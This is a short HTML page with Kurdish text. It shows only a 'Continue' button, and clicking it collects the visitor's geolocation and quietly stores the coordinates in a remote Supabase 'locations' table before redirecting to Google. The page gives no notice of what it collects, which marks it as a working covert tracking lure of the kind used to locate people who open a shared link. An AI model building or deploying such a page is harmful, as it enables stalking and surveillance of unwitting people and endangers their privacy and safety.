<!DOCTYPE html>
<html lang="ku">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Continue</title>
  <style>
    body {
      background-color: #000000;
      color: #ffffff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    button {
      background-color: #ffffff;
      color: #000000;
      border: none;
      padding: 15px 35px;
      font-size: 18px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

  <button id="btn">بەردەوام بوون</button>

  <script>
    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";

    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    document.getElementById('btn').addEventListener('click', function() {
      if (!navigator.geolocation) {
        alert("Geolocation پشتیوانی ناهێنرێت لەم مۆبایلە/بڕاوسەرە!");
        window.location.href = "https://www.google.com";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async function(pos) {
          try {
            await supabase.from('locations').insert([{
              name: 'Visitor',
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            }]);
          } catch (e) {
            console.log(e);
          } finally {
            window.location.href = "https://www.google.com";
          }
        },
        function(err) {
          alert("هەڵە لە وەرگرتنی شوێن: " + err.message);
          window.location.href = "https://www.google.com";
        },
        { enableHighAccuracy: false, timeout: 10000 }
      );
    });
  </script>

</body>
</html>
